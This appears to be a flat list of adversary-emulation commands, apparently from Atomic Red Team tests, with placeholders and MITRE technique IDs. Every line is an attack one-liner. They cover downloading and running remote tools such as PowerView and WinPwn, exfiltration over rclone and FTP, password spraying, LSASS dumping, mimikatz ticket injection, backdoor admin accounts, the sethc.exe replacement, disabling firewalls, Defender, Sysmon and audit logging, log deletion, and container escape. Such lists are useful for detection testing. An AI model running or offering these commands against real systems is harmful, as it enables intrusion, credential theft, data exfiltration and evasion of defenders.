echo [InternetShortcut] > #{shortcut_file_path};echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path};#{shortcut_file_path}
(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
setfile -a V #{filename}
pktmon.exe start --etw  -f %TEMP%\t1040.etl;TIMEOUT /T 5 >nul 2>&1;pktmon.exe stop
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=organizationalUnit) #{optional_args}
powershell.exe -e  #{obfuscated_code}
echo "dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}" > tempadmin.ldif&&echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif&&ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
finger base64_filedata@#{remote_host}
sudo cat /etc/master.passwd > #{output_file}&&cat #{output_file}
aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json&&echo "*** Log Group Created ***"&&aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}&&echo "*** Log Stream Created ***"&&aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}&&echo "*** Log Stream Deleted ***"&&aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json&&echo "*** Log Group Deleted ***"
Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}
bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi&&printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common&&echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common&&printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common&&sudo chmod +x /etc/rc.common
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
$rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName;$exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName;&$rclone_bin config create ftpserver "ftp" "host" #{ftp_server} "port" #{ftp_port} "user" #{ftp_user} "pass" #{ftp_pass};&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
Start-Process "#{Ammyy_Admin_Path}"
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
cipher.exe /w:C:
$machine_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt";$offline_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt";$completed_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt";foreach ($machine in get-content -path "$machine_list");{if (test-connection -Count 1 -computername $machine -quiet) ;{cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}";echo $machine >> "$completed_list";wmic /node: "$machine" process call create "regsvr32.exe /i #{remote_drive_letter}:#{exe_remote_folder}"};else;{echo $machine >> "$offline_list"}}
"#{mimikatz_exe}" "kerberos::ptt #{ticket}"
$xml = [System.IO.File]::ReadAllText("#{xml_path}");Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
if [ -x "$(command -v dscacheutil)" ]; then dscacheutil -q group; else echo "dscacheutil is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v dscl)" ]; then dscl . -list /Groups; else echo "dscl is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v groups)" ]; then groups; else echo "groups is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v id)" ]; then id; else echo "id is missing from the machine. skipping..."; fi;&&if [ -x "$(command -v getent)" ]; then getent group; else echo "getent is missing from the machine. skipping..."; fi;&&cat /etc/group
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick
wuauclt.exe /UpdateDeploymentProvider "#{arbitrary_dll}" /RunHandlerComServer
sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}&&if [ -f "/etc/#{auditd_config_file_name}" ];&&then sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}&&else sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}&&fi &&sed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}
[ "$(uname)" = 'FreeBSD' ] && cmd="lastlogin" || cmd="lastlog" &&$cmd > #{output_file}&&cat #{output_file}
dir | clip;echo "T1115" > %temp%\T1115.txt;clip < %temp%\T1115.txt
sudo insmod #{module_path}
cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*";MpCmdRun.exe -DownloadFile -url #{remote_file} -path #{local_path}
$macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt");$macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin";[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType "DWord" -Force
reg add "HKLM\SOFTWARE\Policies\Microsoft\FIDO" /v "AllowExternalDeviceSignon" /t REG_DWORD /d 0 /f
Get-ChildItem "#{file_path}" | % { $_.LastAccessTime = "#{target_date_time}" }
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');sensitivefiles -noninteractive -consoleoutput
pktmon.exe filter add -p 445
setenforce 0
mkdir $HOME/...&&cp $(which sh) $HOME/...&&$HOME/.../sh -c "echo #{test_message}"
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\CurrentUserObject.txt
if ("#{auth}".ToLower() -NotIn @("ntlm","kerberos")) {;  Write-Host "Only 'NTLM' and 'Kerberos' auth methods are supported";  exit 1;};;$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName;;[System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null;$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("#{domain}",389);;$DomainUsers | Foreach-Object {;  $user = $_;  $password = '#{password}';;  $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}");  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth});  try {;    Write-Host " [-] Attempting ${password} on account ${user}.";    $conn.bind();    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success;    Write-Host " [!] ${user}:${password} are valid credentials!";  } catch {;    Write-Host $_.Exception.Message;  };};Write-Host "End of password spraying"
sudo echo osascript -e 'tell app "Finder" to display dialog "Hello World"' >> /etc/rc.common
cscript "#{vbscript}" > $env:TEMP\T1059.005.out.txt
netsh.exe advfirewall  show allprofiles ;netsh.exe advfirewall firewall dump;netsh.exe advfirewall show currentprofile;netsh.exe advfirewall firewall show rule name=all;netsh.exe firewall show state;netsh.exe firewall show config;sc query windefend;powershell.exe /c "Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }";powershell.exe /c "Get-Service | where-object {$_.DisplayName -like '*sysm*'}";powershell.exe /c "Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''";tasklist.exe;tasklist.exe | findstr /i virus;tasklist.exe | findstr /i cb;tasklist.exe | findstr /i defender;tasklist.exe | findstr /i cylance;tasklist.exe | findstr /i mc;tasklist.exe | findstr /i "virus cb defender cylance mc"
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
attrib.exe -r #{file_or_folder}\*.* /s
"#{uacme_exe}"
chown #{owner}:#{group} #{file_or_folder}
ENCODED=$(echo '#{message}' | b64encode -r -)&&printf $ENCODED | b64decode -r&&echo $ENCODED | b64decode -r&&echo $(echo $ENCODED) | b64decode -r&&echo $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}&&echo $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}&&echo $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r&&echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r
$OriginalCommand = '#{powershell_command}';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand);$EncodedCommand =[Convert]::ToBase64String($Bytes);$EncodedCommand;powershell.exe -EncodedCommand $EncodedCommand
rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
#{msi_exe} /y "#{dll_payload}"
touch #{file_to_setuid}&&chown root #{file_to_setuid}&&chmod g+xs #{file_to_setuid}
sudo srm #{system_log_path} #system log file deletion&&sudo srm -r #{system_log_folder} #recursive deletion of log files
function Invoke-dpsLight ($Password, $userlist) {;$users = Get-Content $userlist;$Domain = "LDAP://" + ([ADSI]"").distinguishedName;foreach ($User in $users) {;  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password);  if ($Domain_check.name -ne $null) {;    Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password";  };  else { Write-Host ". " -NoNewline};};Write-Host -ForegroundColor green "Finished";};Invoke-dpsLight "#{password}" $env:Temp\usersdpsLight.txt
ln -sf /dev/null #{history_path}
pw adduser art -g wheel -s /bin/sh&&echo "password123" | pw usermod art -h 0&&su art&&cd /tmp&&curl -s #{remote_url} |bash
REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0
Set-Location "PathToAtomicsFolder";.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
grep -ri password #{file_path}&&exit 0
New-LocalUser -Name "#{username}" -NoPassword
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t REG_DWORD /d 1 /f
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');GPORemoteAccessPolicy -consoleoutput -noninteractive
sudo modprobe #{rootkit_name}
([adsisearcher]"objectcategory=computer").FindAll(); ([adsisearcher]"objectcategory=computer").FindOne()
echo '#{command_to_add}' >> ~/.bash_profile
sc.exe create #{service_name} binPath= "#{binary_path}" start=#{startup_type}  type=#{service_type};sc.exe start #{service_name}
cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
reg add "HKCU\Software\Policies\Microsoft\Windows\OOBE" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f
sysmon -u
$process = Start-Process #{spawn_process_path} -passthru;$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug
TEST=$(echo $HISTFILESIZE)&&echo $HISTFILESIZE&&export HISTFILESIZE=0&&if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo "\$HISTFILESIZE is zero"; fi&&# -> $HISTFILESIZE is zero
wevtutil sl "#{log_name}" /e:false
type C:\Windows\Panther\unattend.xml;type C:\Windows\Panther\Unattend\unattend.xml
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideClock /t REG_DWORD /d 1 /f
kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcess.exe -program "#{hollow_binary_path}" -debug
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
sudo launchctl unload #{falcond_plist}&&sudo launchctl unload #{userdaemon_plist}
$o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"));$item = $o.Item();$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');RBCD-Check -consoleoutput -noninteractive
users&&w&&who
arp -a
import-module "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1";Invoke-EnumerateAzureBlobs -base #{base} -permutations "#{wordlist}" -outputfile "#{output_file}"
export HISTCONTROL=ignoreboth&&#{evil_command}
FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b;call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|#{remote_url}"
mkdir -p /var/spool/mail/copy&&for file in /var/spool/mail/*; do&&  if [ "$(basename "$file")" != "copy" ]&&  then&&    cp -R "$file" /var/spool/mail/copy/&&    if [ -f "/var/spool/mail/copy/$(basename "$file")" ]; then&&      echo "Modification for Atomic Red Test" >> "/var/spool/mail/copy/$(basename "$file")"&&    fi&&  fi&&done
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize;Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
fltmc.exe unload #{sysmon_driver}
"%PROGRAMFILES(x86)%/#{radmin_exe}"
get-smbshare
import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1";try { Invoke-BloodHound -OutputDirectory $env:Temp };catch { $_; exit $_.Exception.HResult};Start-Sleep 5
Gpscript /logon
"#{gup_executable}"
mkdir %temp%\T1119_command_prompt_collection >nul 2>&1;dir c: /b /s .docx | findstr /e .docx;for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}&&$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}&&$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
zip #{output_file} #{input_files}
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f
auditctl -a always,exit -F arch=b64 -S execve -k CMDS &&auditctl -a always,exit -F arch=b32 -S execve -k CMDS&&whoami; ausearch -i --start $(date +"%d/%m/%y %H:%M:%S") 
Remove-Item -path #{file_to_delete}
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v ShellSmartScreenLevel /t REG_SZ /d Block /f
"#{uacme_exe}"
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
#{xordump_exe} -out #{output_file} -x 0x41
$PathToAtomicsFolder\T1055.004\bin\x64\EarlyBird.exe -program "#{spawn_process_path}" -debug
smbstatus --shares
icacls.exe #{file_or_folder} /grant #{user_or_group}:F
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
wmic shadowcopy call create Volume=#{drive_letter}
$exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe";& "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
findstr /si pass *.xml *.doc *.txt *.xls;ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
$SamAccountName = '#{username}';$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force;Add-Type -AssemblyName System.DirectoryServices.AccountManagement;$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain);$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context);$User.SamAccountName = $SamAccountName;$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword);$User.SetPassword($TempCred.GetNetworkCredential().Password);$User.Enabled = $True;$User.PasswordNotRequired = $False;$User.DisplayName = $SamAccountName;$User.Save();$User
Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1";$file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe";Start-Process $file1 /S;
$Dir_to_copy = "$env:windir\temp";$ftp = "ftp://#{ftp_server}/";$web_client = New-Object System.Net.WebClient;$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}');if (test-connection -count 1 -computername "#{ftp_server}" -quiet);{foreach($file in (dir $Dir_to_copy "*.7z"));{echo "Uploading $file...";$uri = New-Object System.Uri($ftp+$file.name);$web_client.UploadFile($uri, $file.FullName)}};else;{echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
Start-Process #{UltraVNC_Viewer_Path}
tar -cvzf #{output_file} #{input_file_folder}
IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd );takeown /F C:\Windows\System32\sethc.exe /A;icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t;copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Set-Location "PathToAtomicsFolder";.\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
find #{file_path} -name "credentials" -type f -path "*/.aws/*" 2>/dev/null
cmd.exe /C whoami;wmic useraccount get /ALL;quser /SERVER:"#{computer_name}";quser;qwinsta.exe /server:#{computer_name};qwinsta.exe;for /F "tokens=1,2" %i in ('qwinsta /server:#{computer_name} ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > computers.txt;@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force   
#{compiled_file} /tmp/ T1222002
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language
netstat;net use;net sessions
Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt;$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt;@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"&&sh -c "echo 'ping -c 4 8.8.8.8' >> #{script_path}"&&chmod +x #{script_path}&&sh #{script_path}
$folderarray = @("Desktop", "Downloads", "Documents", "AppData/Local", "AppData/Roaming");Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append #{File_to_output};Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append #{File_to_output};Get-ChildItem -Path "${env:ProgramFiles(x86)}" -erroraction silentlycontinue | Out-File -append #{File_to_output};$UsersFolder = "$env:homedrive\Users\";foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ;{;foreach ($secondarydirectory in $folderarray); {Get-ChildItem -Path "$UsersFolder/$directory/$secondarydirectory" -ErrorAction SilentlyContinue | Out-File -append #{File_to_output}};};cat #{File_to_output}
Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
dscl . -create /Users/#{username}&&dscl . -create /Users/#{username} UserShell /bin/zsh&&dscl . -create /Users/#{username} RealName "#{realname}"&&dscl . -create /Users/#{username} UniqueID "1010"&&dscl . -create /Users/#{username} PrimaryGroupID 80&&dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
groups&&id
sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content&&sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place
New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}";Start-Service -Name "#{service_name}"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCANetwork /t REG_DWORD /d 1 /f
cscript "#{jscript}" > %tmp%\T1059.007.out.txt
if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;&&sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}&&sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');fruit -noninteractive -consoleoutput
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=computer) #{optional_args}
net user #{user_account} #{new_user_password} /add;net.exe user #{user_account} /delete
dseditgroup -o edit -a art-user -t user admin
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -f (objectcategory=person) #{optional_args}
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell");;Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell-backup" -Value "$oldvalue";;$newvalue = $oldvalue + ", #{payload}";;Set-ItemProperty -Path  "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "$newvalue"
Invoke-WebRequest #{domain} -UserAgent "HttpBrowser/1.0" | out-null;Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null;Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null;Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
mkdir ~/Library/Mail/copy&&cp -R ~/Library/Mail/* ~/Library/Mail/copy&&rm -rf ~/Library/Mail/copy/*
get-addefaultdomainpasswordpolicy
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion
poweroff
net time \\#{computer_name};w32tm /tz
echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf&&grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
C:\Windows\SysWow64\Register-CimProvider.exe -Path "#{dll_payload}"
odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoTrayContextMenu /t REG_DWORD /d 1 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" /v Enabled /t REG_DWORD /d 0 /f
#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
iptables-save > /tmp/iptables.rules&&iptables -F
$mypid = #{process_id};mavinject $mypid /INJECTRUNNING "#{dll_payload}";Stop-Process -processname notepad
ufw prepend deny from 1.2.3.4&&ufw status numbered
